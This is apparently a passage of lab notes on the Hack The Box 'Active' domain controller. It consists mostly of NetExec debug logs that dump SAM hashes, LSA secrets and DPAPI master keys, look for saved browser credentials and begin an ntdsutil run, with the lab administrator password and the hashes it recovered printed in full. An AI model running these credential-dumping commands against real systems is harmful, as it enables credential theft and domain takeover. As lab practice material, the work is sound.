           DEBUG    smb hosts() - results: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None, None)]                                                         database.py:485
           DEBUG    users: <sqlalchemy.engine.cursor.CursorResult object at 0x7f3a02e32040>, hosts: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None,       database.py:362
                    None)]                                                                                                                                                                                                                  
           DEBUG    Calling command arguments                                                                                                                                                                              connection.py:241
           DEBUG    Calling sam()                                                                                                                                                                                          connection.py:263
[13:03:43] DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.175.223                                                                                                                                                             database.py:133
           DEBUG    smb hosts() - results: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None, None)]                                                         database.py:485
[13:03:43] INFO     SMB         10.129.175.223  445    DC               Dumping SAM hashes                                                                                                                                       smb.py:1598
[13:03:52] INFO     SMB         10.129.175.223  445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c15eb37006fb74c21a5d1e2144b726e:::                                                                   smb.py:1570
[13:03:52] DEBUG    Adding credentials: [{'id': 5, 'domain': 'DC', 'username': 'Administrator', 'password': 'aad3b435b51404eeaad3b435b51404ee:5c15eb37006fb74c21a5d1e2144b726e', 'credtype': 'hash', 'pillaged_from_hostid': database.py:332
                    None, 'pillaged_from': 3}]                                                                                                                                                                                              
[13:03:55] INFO     SMB         10.129.175.223  445    DC               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                           smb.py:1570
[13:03:55] DEBUG    Adding credentials: [{'id': 6, 'domain': 'DC', 'username': 'Guest', 'password': 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0', 'credtype': 'hash', 'pillaged_from_hostid': None,   database.py:332
                    'pillaged_from': 3}]                                                                                                                                                                                                    
[13:03:55] INFO     SMB         10.129.175.223  445    DC               Added 2 SAM hashes to the database                                                                                                                       smb.py:1602
           DEBUG    Closing connection to: 10.129.175.223                                                                                                                                                                  connection.py:178
```


### --lsa
```sh
└─$ netexec smb 10.129.175.223 -u 'active.htb\administrator' -p 'Ticketmaster1968' --lsa --debug
[14:44:21] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
           DEBUG    PYTHON VERSION: 3.13.3 (main, Apr 10 2025, 21:38:51) [GCC 14.2.0]                                                                                                                                          netexec.py:81
           DEBUG    RUNNING ON: Linux Release: 6.12.33+kali-amd64                                                                                                                                                              netexec.py:82
           DEBUG    Passed args: Namespace(version=False, threads=256, timeout=None, jitter=None, verbose=False, debug=True, no_progress=False, log=None, force_ipv6=False, dns_server=None, dns_tcp=False, dns_timeout=3,     netexec.py:83
                    protocol='smb', target=['10.129.175.223'], username=['active.htb\\administrator'], password=['Ticketmaster1968'], cred_id=[], ignore_pw_decoding=False, no_bruteforce=False, continue_on_success=False,                 
                    gfail_limit=None, ufail_limit=None, fail_limit=None, kerberos=False, use_kcache=False, aesKey=None, kdcHost=None, pfx_cert=None, pfx_base64=None, pfx_pass=None, pem_cert=None, pem_key=None,                           
                    server='https', server_host='0.0.0.0', server_port=None, connectback_host=None, module=None, module_options=[], list_modules=False, show_module_options=False, hash=[], delegate=None, no_s4u2proxy=False,              
                    domain=None, local_auth=False, port=445, share='C$', smb_server_port=445, no_smbv1=False, gen_relay_list=None, smb_timeout=2, laps=None, generate_hosts_file=None, generate_krb5_file=None, sam=None,                   
                    lsa='regdump', ntds=None, dpapi=None, sccm=None, mkfile=None, pvk=None, enabled=False, userntds=None, shares=False, dir=None, interfaces=False, no_write_check=False, filter_shares=None,                               
                    smb_sessions=False, disks=False, loggedon_users_filter=None, loggedon_users=None, users=None, users_export=None, groups=None, computers=None, local_groups=None, pass_pol=False, rid_brute=None,                        
                    qwinsta=False, tasklist=False, wmi=None, wmi_namespace='root\\cimv2', spider=None, spider_folder='.', content=False, exclude_dirs='', depth=None, only_files=False, pattern=None, regex=None,                           
                    put_file=None, get_file=None, append_host=False, exec_method='wmiexec', dcom_timeout=5, get_output_tries=100, codec='utf-8', no_output=False, execute=None, ps_execute=None, obfs=False, amsi_bypass=None,              
                    clear_obfscripts=False, force_ps32=False, no_encode=False)                                                                                                                                                              
           DEBUG    Protocol: smb                                                                                                                                                                                             netexec.py:137
           DEBUG    Protocol Path: /usr/lib/python3/dist-packages/nxc/protocols/smb.py                                                                                                                                        netexec.py:140
           DEBUG    Protocol DB Path: /usr/lib/python3/dist-packages/nxc/protocols/smb/database.py                                                                                                                            netexec.py:142
           DEBUG    symmetric using "pyCryptodomex" for "DES"                                                                                                                                                                 __init__.py:55
[14:44:22] DEBUG    symmetric using "pyCryptodomex" for "TDES"                                                                                                                                                                __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "AES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "RC4"                                                                                                                                                                 __init__.py:55
           DEBUG    Protocol Object: <class 'protocol.smb'>, type: <class 'type'>                                                                                                                                             netexec.py:145
           DEBUG    Protocol DB Object: <class 'protocol.database'>                                                                                                                                                           netexec.py:147
           DEBUG    DB Path: /home/kali/.nxc/workspaces/default/smb.db                                                                                                                                                        netexec.py:150
           DEBUG    Using selector: EpollSelector                                                                                                                                                                      selector_events.py:64
           DEBUG    Creating ThreadPoolExecutor                                                                                                                                                                                netexec.py:45
           DEBUG    Creating thread for <class 'protocol.smb'>                                                                                                                                                                 netexec.py:48
           INFO     Socket info: host=10.129.175.223, hostname=10.129.175.223, kerberos=False, ipv6=False, link-local ipv6=False                                                                                           connection.py:165
           DEBUG    Kicking off proto_flow                                                                                                                                                                                 connection.py:227
           INFO     Creating SMBv3 connection to 10.129.175.223                                                                                                                                                                   smb.py:606
[14:44:23] DEBUG    Created connection object                                                                                                                                                                              connection.py:232
[14:44:24] DEBUG    Server OS: Windows 7 / Server 2008 R2 Build 7601 6.1 build 7601                                                                                                                                               smb.py:280
[14:44:26] INFO     Creating SMBv1 connection to 10.129.175.223                                                                                                                                                                   smb.py:575
[14:44:27] INFO     SMBv1 disabled on 10.129.175.223                                                                                                                                                                              smb.py:598
           DEBUG    Update Hosts: [{'id': 3, 'ip': '10.129.175.223', 'hostname': 'DC', 'domain': 'active.htb', 'os': 'Windows 7 / Server 2008 R2 Build 7601', 'dc': None, 'smbv1': False, 'signing': True, 'spooler': None,  database.py:265
                    'zerologon': None, 'petitpotam': None}]                                                                                                                                                                                 
           DEBUG    add_host() - Host IDs Updated: [3]                                                                                                                                                                       database.py:275
           INFO     Error resolving hostname active.htb: [Errno -2] Name or service not known                                                                                                                              connection.py:192
           INFO     Resolved domain: active.htb with dns, kdcHost: None                                                                                                                                                           smb.py:321
[14:44:27] INFO     SMB         10.129.175.223  445    DC               Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)                                                      smb.py:327
           DEBUG    Trying to authenticate using plaintext with domain                                                                                                                                                     connection.py:497
           INFO     Creating SMBv3 connection to 10.129.175.223                                                                                                                                                                   smb.py:606
[14:44:30] DEBUG    Logged in with password to SMB with active.htb/administrator                                                                                                                                                  smb.py:468
           DEBUG    self.is_guest=False                                                                                                                                                                                           smb.py:470
           DEBUG    Checking if user is admin on 10.129.175.223                                                                                                                                                                   smb.py:646
[14:44:38] DEBUG    User is admin on 10.129.175.223!                                                                                                                                                                              smb.py:661
           DEBUG    Adding credential: active.htb/administrator:Ticketmaster1968                                                                                                                                                  smb.py:474
           DEBUG    Adding credentials: [{'id': 2, 'domain': 'active.htb', 'username': 'administrator', 'password': 'Ticketmaster1968', 'credtype': 'plaintext', 'pillaged_from_hostid': None}]                              database.py:332
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.175.223                                                                                                                                                             database.py:133
           DEBUG    smb hosts() - results: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None, None)]                                                         database.py:485
[14:44:38] INFO     SMB         10.129.175.223  445    DC               active.htb\administrator:Ticketmaster1968 (Pwn3d!)                                                                                                        smb.py:481
           DEBUG    Adding admin user: active.htb/administrator:Ticketmaster1968@10.129.175.223                                                                                                                                   smb.py:486
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.175.223                                                                                                                                                             database.py:133
           DEBUG    smb hosts() - results: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None, None)]                                                         database.py:485
           DEBUG    users: <sqlalchemy.engine.cursor.CursorResult object at 0x7f8482c2df60>, hosts: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None,       database.py:362
                    None)]                                                                                                                                                                                                                  
           DEBUG    Calling command arguments                                                                                                                                                                              connection.py:241
           DEBUG    Calling lsa()                                                                                                                                                                                          connection.py:263
[14:44:51] INFO     SMB         10.129.175.223  445    DC               Dumping LSA secrets                                                                                                                                      smb.py:1888
[14:45:09] INFO     SMB         10.129.175.223  445    DC               ACTIVE\DC$:aes256-cts-hmac-sha1-96:3d92a227d41f2c3ad2f9c6327de9ed901ee55f232057af8a7809bbaa757ddded                                                      smb.py:1858
[14:45:09] INFO     SMB         10.129.175.223  445    DC               ACTIVE\DC$:aes128-cts-hmac-sha1-96:600325ee57f21c436e055392f46ee447                                                                                      smb.py:1858
[14:45:09] INFO     SMB         10.129.175.223  445    DC               ACTIVE\DC$:des-cbc-md5:c2d6a1c43d7a6bd3                                                                                                                  smb.py:1858
[14:45:10] INFO     SMB         10.129.175.223  445    DC                                                                                                                                                                        smb.py:1858
                    ACTIVE\DC$:plain_password_hex:efd1bb12f57393e2d901e38aabc806bce83df809a3c69183e2b3d9bc3f4e5a03f53a24e1f2c01ca7f0c847cc9e169473a673c251eb734c8c2e509181337ce8fc502cefb1e76cc4df3d0b56a3aaedab8d56edc00d0bfc22            
                    bad09e2243a08d60fa7ab21d0cc7d3dde8db3b8a274365a0d2583ebb7bdf02bae7466dc929aaabd53212c9bf6532c18311a50da888f509d3329fea43eb17c2089a8a3eec6033f1e2db4a32888dcfc09ecd60909b71ca2235bb89d102aabc11d8bd8cf24106dd            
                    c521c4b3194594703c0369e3181e231fc9b140b614a422bfb153197242bf435d6992d4e0d2ee44102ba7130d05e8d3c03c7084                                                                                                                  
[14:45:10] INFO     SMB         10.129.175.223  445    DC               ACTIVE\DC$:aad3b435b51404eeaad3b435b51404ee:b708b6f85a816852dfd65a8f81ca175e:::                                                                          smb.py:1858
[14:45:14] INFO     SMB         10.129.175.223  445    DC               (Unknown User):ROOT#123                                                                                                                                  smb.py:1858
[14:45:16] INFO     SMB         10.129.175.223  445    DC               dpapi_machinekey:0x377bd35be67705f345dabf00d3181e269e0fb1e6                                                                                              smb.py:1858
                    dpapi_userkey:0x7586c391e559565c85cb342d1d24546381f0d5cb                                                                                                                                                                
[14:45:16] INFO     SMB         10.129.175.223  445    DC               Dumped 7 LSA secrets to /home/kali/.nxc/logs/lsa/DC_10.129.175.223_2025-07-24_144425.secrets and                                                         smb.py:1894
                    /home/kali/.nxc/logs/lsa/DC_10.129.175.223_2025-07-24_144425.cached                                                                                                                                                     
[14:45:17] DEBUG    Closing connection to: 10.129.175.223                                                                                                                                                                  connection.py:178
```


### --dpapi
```sh
└─$ netexec smb 10.129.175.223 -u 'active.htb\administrator' -p 'Ticketmaster1968' --dpapi --debug
[15:31:32] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
           DEBUG    PYTHON VERSION: 3.13.3 (main, Apr 10 2025, 21:38:51) [GCC 14.2.0]                                                                                                                                          netexec.py:81
           DEBUG    RUNNING ON: Linux Release: 6.12.33+kali-amd64                                                                                                                                                              netexec.py:82
           DEBUG    Passed args: Namespace(version=False, threads=256, timeout=None, jitter=None, verbose=False, debug=True, no_progress=False, log=None, force_ipv6=False, dns_server=None, dns_tcp=False, dns_timeout=3,     netexec.py:83
                    protocol='smb', target=['10.129.175.223'], username=['active.htb\\administrator'], password=['Ticketmaster1968'], cred_id=[], ignore_pw_decoding=False, no_bruteforce=False, continue_on_success=False,                 
                    gfail_limit=None, ufail_limit=None, fail_limit=None, kerberos=False, use_kcache=False, aesKey=None, kdcHost=None, pfx_cert=None, pfx_base64=None, pfx_pass=None, pem_cert=None, pem_key=None,                           
                    server='https', server_host='0.0.0.0', server_port=None, connectback_host=None, module=None, module_options=[], list_modules=False, show_module_options=False, hash=[], delegate=None, no_s4u2proxy=False,              
                    domain=None, local_auth=False, port=445, share='C$', smb_server_port=445, no_smbv1=False, gen_relay_list=None, smb_timeout=2, laps=None, generate_hosts_file=None, generate_krb5_file=None, sam=None,                   
                    lsa=None, ntds=None, dpapi=[], sccm=None, mkfile=None, pvk=None, enabled=False, userntds=None, shares=False, dir=None, interfaces=False, no_write_check=False, filter_shares=None, smb_sessions=False,                  
                    disks=False, loggedon_users_filter=None, loggedon_users=None, users=None, users_export=None, groups=None, computers=None, local_groups=None, pass_pol=False, rid_brute=None, qwinsta=False,                             
                    tasklist=False, wmi=None, wmi_namespace='root\\cimv2', spider=None, spider_folder='.', content=False, exclude_dirs='', depth=None, only_files=False, pattern=None, regex=None, put_file=None,                           
                    get_file=None, append_host=False, exec_method='wmiexec', dcom_timeout=5, get_output_tries=100, codec='utf-8', no_output=False, execute=None, ps_execute=None, obfs=False, amsi_bypass=None,                             
                    clear_obfscripts=False, force_ps32=False, no_encode=False)                                                                                                                                                              
           DEBUG    Protocol: smb                                                                                                                                                                                             netexec.py:137
           DEBUG    Protocol Path: /usr/lib/python3/dist-packages/nxc/protocols/smb.py                                                                                                                                        netexec.py:140
           DEBUG    Protocol DB Path: /usr/lib/python3/dist-packages/nxc/protocols/smb/database.py                                                                                                                            netexec.py:142
[15:31:33] DEBUG    symmetric using "pyCryptodomex" for "DES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "TDES"                                                                                                                                                                __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "AES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "RC4"                                                                                                                                                                 __init__.py:55
           DEBUG    Protocol Object: <class 'protocol.smb'>, type: <class 'type'>                                                                                                                                             netexec.py:145
           DEBUG    Protocol DB Object: <class 'protocol.database'>                                                                                                                                                           netexec.py:147
           DEBUG    DB Path: /home/kali/.nxc/workspaces/default/smb.db                                                                                                                                                        netexec.py:150
           DEBUG    Using selector: EpollSelector                                                                                                                                                                      selector_events.py:64
           DEBUG    Creating ThreadPoolExecutor                                                                                                                                                                                netexec.py:45
           DEBUG    Creating thread for <class 'protocol.smb'>                                                                                                                                                                 netexec.py:48
           INFO     Socket info: host=10.129.175.223, hostname=10.129.175.223, kerberos=False, ipv6=False, link-local ipv6=False                                                                                           connection.py:165
           DEBUG    Kicking off proto_flow                                                                                                                                                                                 connection.py:227
           INFO     Creating SMBv3 connection to 10.129.175.223                                                                                                                                                                   smb.py:606
[15:31:34] DEBUG    Created connection object                                                                                                                                                                              connection.py:232
[15:31:35] DEBUG    Server OS: Windows 7 / Server 2008 R2 Build 7601 6.1 build 7601                                                                                                                                               smb.py:280
[15:31:37] INFO     Creating SMBv1 connection to 10.129.175.223                                                                                                                                                                   smb.py:575
[15:31:38] INFO     SMBv1 disabled on 10.129.175.223                                                                                                                                                                              smb.py:598
           DEBUG    Update Hosts: [{'id': 3, 'ip': '10.129.175.223', 'hostname': 'DC', 'domain': 'active.htb', 'os': 'Windows 7 / Server 2008 R2 Build 7601', 'dc': None, 'smbv1': False, 'signing': True, 'spooler': None,  database.py:265
                    'zerologon': None, 'petitpotam': None}]                                                                                                                                                                                 
           DEBUG    add_host() - Host IDs Updated: [3]                                                                                                                                                                       database.py:275
           INFO     Error resolving hostname active.htb: [Errno -2] Name or service not known                                                                                                                              connection.py:192
           INFO     Resolved domain: active.htb with dns, kdcHost: None                                                                                                                                                           smb.py:321
[15:31:38] INFO     SMB         10.129.175.223  445    DC               Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)                                                      smb.py:327
           DEBUG    Trying to authenticate using plaintext with domain                                                                                                                                                     connection.py:497
           INFO     Creating SMBv3 connection to 10.129.175.223                                                                                                                                                                   smb.py:606
[15:31:41] DEBUG    Logged in with password to SMB with active.htb/administrator                                                                                                                                                  smb.py:468
           DEBUG    self.is_guest=False                                                                                                                                                                                           smb.py:470
           DEBUG    Checking if user is admin on 10.129.175.223                                                                                                                                                                   smb.py:646
[15:31:49] DEBUG    User is admin on 10.129.175.223!                                                                                                                                                                              smb.py:661
           DEBUG    Adding credential: active.htb/administrator:Ticketmaster1968                                                                                                                                                  smb.py:474
           DEBUG    Adding credentials: [{'id': 2, 'domain': 'active.htb', 'username': 'administrator', 'password': 'Ticketmaster1968', 'credtype': 'plaintext', 'pillaged_from_hostid': None}]                              database.py:332
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.175.223                                                                                                                                                             database.py:133
           DEBUG    smb hosts() - results: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None, None)]                                                         database.py:485
[15:31:49] INFO     SMB         10.129.175.223  445    DC               active.htb\administrator:Ticketmaster1968 (Pwn3d!)                                                                                                        smb.py:481
           DEBUG    Adding admin user: active.htb/administrator:Ticketmaster1968@10.129.175.223                                                                                                                                   smb.py:486
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.175.223                                                                                                                                                             database.py:133
           DEBUG    smb hosts() - results: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None, None)]                                                         database.py:485
           DEBUG    users: <sqlalchemy.engine.cursor.CursorResult object at 0x7f74f5529f60>, hosts: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None,       database.py:362
                    None)]                                                                                                                                                                                                                  
           DEBUG    Calling command arguments                                                                                                                                                                              connection.py:241
           DEBUG    Calling dpapi()                                                                                                                                                                                        connection.py:263
           DEBUG    get_domain_backupkey(domain=active.htb) => []                                                                                                                                                            database.py:716
           DEBUG    Connecting to active.htb                                                                                                                                                                                      smb.py:160
           DEBUG    Could not create connection object to active.htb                                                                                                                                                              smb.py:117
           DEBUG    Connecting to 10.129.175.223                                                                                                                                                                                  smb.py:160
[15:31:51] DEBUG    Authenticating with administrator through NTLM                                                                                                                                                                smb.py:163
[15:31:52] INFO     SMB         10.129.175.223  445    DC               Collecting DPAPI masterkeys, grab a coffee and be patient...                                                                                             dpapi.py:67
[15:31:52] DEBUG    Masterkeys Triage: <dploot.triage.masterkeys.MasterkeysTriage object at 0x7f74f5522270>                                                                                                                      dpapi.py:76
           DEBUG    Collecting user masterkeys                                                                                                                                                                                   dpapi.py:78
[15:31:58] DEBUG    Found MasterKey: \\10.129.175.223\C$\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-405608879-3187717380-1996298813-500\cae673a5-24a8-44de-b3e9-6a3987653ac1                           masterkeys.py:218
[15:32:00] DEBUG    Found MasterKey: \\10.129.175.223\C$\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-405608879-3187717380-1996298813-500\d2d5c8b5-73e5-468e-8d7a-5801c0f23c8c                           masterkeys.py:218
[15:32:05] DEBUG    Collecting machine masterkeys                                                                                                                                                                                dpapi.py:81
[15:32:17] DEBUG    Got Bootkey: b'ff954ee81ffb63937b563f523caf1d59'                                                                                                                                                        masterkeys.py:77
[15:33:05] DEBUG    Found SYSTEM system MasterKey: \\10.129.175.223\C$\Windows\System32\Microsoft\Protect\S-1-5-18\09d54a81-ccc1-478c-9ac9-84b106a885c0                                                                    masterkeys.py:122
[15:33:11] DEBUG    Found SYSTEM user MasterKey: \\10.129.175.223\C$\Windows\System32\Microsoft\Protect\S-1-5-18\User\2710b833-8692-4678-9f26-2fba8219f2b3                                                                 masterkeys.py:152
[15:33:13] DEBUG    Found SYSTEM user MasterKey: \\10.129.175.223\C$\Windows\System32\Microsoft\Protect\S-1-5-18\User\43ea2159-28dc-4507-90bd-751f19e7db5d                                                                 masterkeys.py:152
[15:33:16] DEBUG    Found SYSTEM user MasterKey: \\10.129.175.223\C$\Windows\System32\Microsoft\Protect\S-1-5-18\User\86e2929f-5a99-4860-a8a3-e2b9a8eb65f9                                                                 masterkeys.py:152
[15:33:21] DEBUG    Found SYSTEM system MasterKey: \\10.129.175.223\C$\Windows\System32\Microsoft\Protect\S-1-5-20\18b1bd41-905a-4066-9d39-f8a1acf0c9f4                                                                    masterkeys.py:122
[15:33:23] INFO     SMB         10.129.175.223  445    DC               Got 7 decrypted masterkeys. Looting secrets...                                                                                                           smb.py:1725
[15:33:23] DEBUG    Credentials Triage Object: <dploot.triage.credentials.CredentialsTriage object at 0x7f74f5522120>                                                                                                            smb.py:1745
[15:33:39] DEBUG    Exception occurred while trying to read Users\Administrator\AppData\Local\Google\Chrome\User Data\Local State: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path Not Found} The path  smb.py:284
                    %hs does not exist.                                                                                                                                                                                                     
           DEBUG    Exception occurred while trying to read Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Login Data: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path Not Found}    smb.py:284
                    The path %hs does not exist.                                                                                                                                                                                            
[15:33:40] DEBUG    Exception occurred while trying to read Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Web Data: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path Not Found} The  smb.py:284
                    path %hs does not exist.                                                                                                                                                                                                
[15:33:41] DEBUG    Exception occurred while trying to read Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Local State: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path Not Found} The path smb.py:284
                    %hs does not exist.                                                                                                                                                                                                     
[15:33:42] DEBUG    Exception occurred while trying to read Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default\Login Data: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path Not Found}   smb.py:284
                    The path %hs does not exist.                                                                                                                                                                                            
[15:33:43] DEBUG    Exception occurred while trying to read Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default\Web Data: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path Not Found} The smb.py:284
                    path %hs does not exist.                                                                                                                                                                                                
[15:33:44] DEBUG    Exception occurred while trying to read Users\Administrator\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path Not    smb.py:284
                    Found} The path %hs does not exist.                                                                                                                                                                                     
[15:33:45] DEBUG    Exception occurred while trying to read Users\Administrator\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path smb.py:284
                    Not Found} The path %hs does not exist.                                                                                                                                                                                 
[15:33:46] DEBUG    Exception occurred while trying to read Users\Administrator\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Web Data: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path   smb.py:284
                    Not Found} The path %hs does not exist.                                                                                                                                                                                 
[15:33:47] DEBUG    Exception occurred while trying to read Users\SVC_TGS\AppData\Local\Google\Chrome\User Data\Local State: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path Not Found} The path %hs    smb.py:284
                    does not exist.                                                                                                                                                                                                         
[15:33:48] DEBUG    Exception occurred while trying to read Users\SVC_TGS\AppData\Local\Google\Chrome\User Data\Default\Login Data: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path Not Found} The path smb.py:284
                    %hs does not exist.                                                                                                                                                                                                     
[15:33:50] DEBUG    Exception occurred while trying to read Users\SVC_TGS\AppData\Local\Google\Chrome\User Data\Default\Web Data: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path Not Found} The path   smb.py:284
                    %hs does not exist.                                                                                                                                                                                                     
[15:33:51] DEBUG    Exception occurred while trying to read Users\SVC_TGS\AppData\Local\Microsoft\Edge\User Data\Local State: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path Not Found} The path %hs   smb.py:284
                    does not exist.                                                                                                                                                                                                         
[15:33:52] DEBUG    Exception occurred while trying to read Users\SVC_TGS\AppData\Local\Microsoft\Edge\User Data\Default\Login Data: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path Not Found} The     smb.py:284
                    path %hs does not exist.                                                                                                                                                                                                
[15:33:53] DEBUG    Exception occurred while trying to read Users\SVC_TGS\AppData\Local\Microsoft\Edge\User Data\Default\Web Data: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path Not Found} The path  smb.py:284
                    %hs does not exist.                                                                                                                                                                                                     
[15:33:54] DEBUG    Exception occurred while trying to read Users\SVC_TGS\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path Not Found}   smb.py:284
                    The path %hs does not exist.                                                                                                                                                                                            
[15:33:55] DEBUG    Exception occurred while trying to read Users\SVC_TGS\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path Not   smb.py:284
                    Found} The path %hs does not exist.                                                                                                                                                                                     
[15:33:56] DEBUG    Exception occurred while trying to read Users\SVC_TGS\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Web Data: SMB SessionError: code: 0xc000003a - STATUS_OBJECT_PATH_NOT_FOUND - {Path Not     smb.py:284
                    Found} The path %hs does not exist.                                                                                                                                                                                     
[15:34:05] DEBUG    Closing connection to: 10.129.175.223
```


### -M ntdsutil
```sh
└─$ netexec smb 10.129.253.25 -u 'active.htb\administrator' -p 'Ticketmaster1968' -M ntdsutil --debug
[10:13:24] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
           DEBUG    PYTHON VERSION: 3.13.3 (main, Apr 10 2025, 21:38:51) [GCC 14.2.0]                                                                                                                                          netexec.py:81
           DEBUG    RUNNING ON: Linux Release: 6.12.33+kali-amd64                                                                                                                                                              netexec.py:82
           DEBUG    Passed args: Namespace(version=False, threads=256, timeout=None, jitter=None, verbose=False, debug=True, no_progress=False, log=None, force_ipv6=False, dns_server=None, dns_tcp=False, dns_timeout=3,     netexec.py:83
                    protocol='smb', target=['10.129.253.25'], username=['active.htb\\administrator'], password=['Ticketmaster1968'], cred_id=[], ignore_pw_decoding=False, no_bruteforce=False, continue_on_success=False,                  
                    gfail_limit=None, ufail_limit=None, fail_limit=None, kerberos=False, use_kcache=False, aesKey=None, kdcHost=None, pfx_cert=None, pfx_base64=None, pfx_pass=None, pem_cert=None, pem_key=None,                           
                    server='https', server_host='0.0.0.0', server_port=None, connectback_host=None, module=['ntdsutil'], module_options=[], list_modules=False, show_module_options=False, hash=[], delegate=None,                          
                    no_s4u2proxy=False, domain=None, local_auth=False, port=445, share='C$', smb_server_port=445, no_smbv1=False, gen_relay_list=None, smb_timeout=2, laps=None, generate_hosts_file=None,                                  
                    generate_krb5_file=None, sam=None, lsa=None, ntds=None, dpapi=None, sccm=None, mkfile=None, pvk=None, enabled=False, userntds=None, shares=False, dir=None, interfaces=False, no_write_check=False,                     
                    filter_shares=None, smb_sessions=False, disks=False, loggedon_users_filter=None, loggedon_users=None, users=None, users_export=None, groups=None, computers=None, local_groups=None, pass_pol=False,                    
                    rid_brute=None, qwinsta=False, tasklist=False, wmi=None, wmi_namespace='root\\cimv2', spider=None, spider_folder='.', content=False, exclude_dirs='', depth=None, only_files=False, pattern=None,                       
                    regex=None, put_file=None, get_file=None, append_host=False, exec_method='wmiexec', dcom_timeout=5, get_output_tries=100, codec='utf-8', no_output=False, execute=None, ps_execute=None, obfs=False,                    
                    amsi_bypass=None, clear_obfscripts=False, force_ps32=False, no_encode=False)                                                                                                                                            
           DEBUG    Protocol: smb                                                                                                                                                                                             netexec.py:137
           DEBUG    Protocol Path: /usr/lib/python3/dist-packages/nxc/protocols/smb.py                                                                                                                                        netexec.py:140
           DEBUG    Protocol DB Path: /usr/lib/python3/dist-packages/nxc/protocols/smb/database.py                                                                                                                            netexec.py:142
[10:13:25] DEBUG    symmetric using "pyCryptodomex" for "DES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "TDES"                                                                                                                                                                __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "AES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "RC4"                                                                                                                                                                 __init__.py:55
           DEBUG    Protocol Object: <class 'protocol.smb'>, type: <class 'type'>                                                                                                                                             netexec.py:145
